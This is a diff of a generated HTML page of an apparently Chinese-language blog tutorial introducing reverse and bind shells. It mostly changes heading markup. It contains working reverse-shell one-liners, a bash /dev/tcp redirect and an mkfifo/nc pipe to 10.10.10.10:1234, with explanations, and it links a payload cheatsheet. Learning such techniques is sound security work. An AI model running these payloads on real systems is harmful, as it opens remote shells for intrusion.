@@ -190,7 +190,7 @@
             
             <span class="tag">
                 
-                <a href="/tags/base" style=color:#00a596>
+                <a href="/tags/base" style=color:#00bcd4>
                     base
                 </a>
             </span>
@@ -200,8 +200,7 @@
     </div>
 
     <div class="content" v-pre>
-        <p>#初见反弹shell</p>
-<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md</a></p>
+        <h1 id="初见反弹shell"><a href="#初见反弹shell" class="headerlink" title="初见反弹shell"></a>初见反弹shell</h1><p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md">https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Bind%20Shell%20Cheatsheet.md</a></p>
 <h3 id="反弹类型："><a href="#反弹类型：" class="headerlink" title="反弹类型："></a>反弹类型：</h3><table>
 <thead>
 <tr>
@@ -223,8 +222,7 @@
 listening on [any] 1234 ...
 </code></pre>
 <p>我们使用的标志如下：</p>
-<p>###nc标志</p>
-<table>
+<h3 id="nc标志"><a href="#nc标志" class="headerlink" title="nc标志"></a>nc标志</h3><table>
 <thead>
 <tr>
 <th>旗</th>
@@ -251,8 +249,7 @@ listening on [any] 1234 ...
 <span id="more"></span>
 
 <p>##Reverse Shell</p>
-<p>###载荷1：</p>
-<pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;
+<h3 id="载荷1："><a href="#载荷1：" class="headerlink" title="载荷1："></a>载荷1：</h3><pre><code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.10.10/1234 0&gt;&amp;1&#39;
 </code></pre>
 <p>在命令行中，<code>bash -c</code> 和 <code>-i</code> 是 <code>bash</code> shell 的选项和参数。</p>
 <ul>
@@ -260,8 +257,7 @@ listening on [any] 1234 ...
 <li><code>-i</code> 参数是交互式模式的意思。它使 <code>bash</code> shell 在启动后成为交互式的，以便用户可以与 shell 进行交互。通常在需要与 shell 进行交互的脚本或命令中使用 <code>-i</code> 参数。例如，<code>bash -i</code> 将启动一个交互式 <code>bash</code> shell。</li>
 </ul>
 <p>在提供的命令中，<code>bash -c &#39;bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1&#39;</code> 结合了这两个选项和参数。它使用 <code>-c</code> 选项来执行指定的命令，而该命令是 <code>bash -i &gt;&amp; /dev/tcp/&#123;ip&#125; 0&gt;&amp;1</code>。这将启动一个交互式 <code>bash</code> shell，并将其标准输出（文件描述符 1）重定向到 <code>/dev/tcp/&#123;ip&#125;</code>，并将标准输入（文件描述符 0）重定向到标准输出。这种配置通常用于建立反向 shell 连接。请注意，<code>&#123;ip&#125;</code> 应该被替换为实际的 IP 地址。</p>
-<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><p>###载荷2：</p>
-<pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f
+<h2 id="Bind-Shell"><a href="#Bind-Shell" class="headerlink" title="Bind Shell"></a>Bind Shell</h2><h3 id="载荷2："><a href="#载荷2：" class="headerlink" title="载荷2："></a>载荷2：</h3><pre><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.10.10 1234 &gt;/tmp/f
 </code></pre>
 <p>提供的命令涉及一系列操作，包括创建命名管道（named pipe），使用<code>cat</code>命令将管道的输出传递给<code>/bin/sh</code>并建立反向 shell 连接。</p>
 <p>具体来说，这个命令的含义如下：</p>
